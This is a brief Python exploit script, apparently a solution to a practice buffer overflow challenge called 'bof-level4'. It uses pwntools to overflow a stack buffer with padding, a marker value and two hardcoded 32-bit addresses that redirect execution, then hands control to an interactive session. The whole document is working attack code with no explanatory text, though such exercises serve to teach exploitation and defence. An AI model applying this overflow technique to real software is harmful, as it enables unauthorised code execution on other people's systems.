#!/usr/bin/env python

from pwn import *

p = process("./bof-level4")

print(p.recv())

buff = "A" * 20
buff += "ABCDEFGH"
buff += "A" * 8
buff += p32(0x0804876b)
buff += "A" * 12
buff += p32(0x8048530)

p.sendline(buff)

p.interactive()
